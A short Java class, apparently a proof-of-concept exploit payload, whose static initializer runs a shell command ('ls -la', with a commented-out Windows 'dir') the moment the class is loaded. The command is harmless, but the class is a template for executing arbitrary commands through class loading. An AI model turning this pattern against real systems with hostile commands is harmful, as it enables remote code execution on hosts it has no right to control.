public class LifExp {

static {
try {
//String[] cmd = {"cmd.exe", "/c", "dir"};
String cmd = "ls -la";
java.lang.Runtime.getRuntime().exec(cmd).waitFor();
} catch ( Exception e ) {
e.printStackTrace();
}
}
}
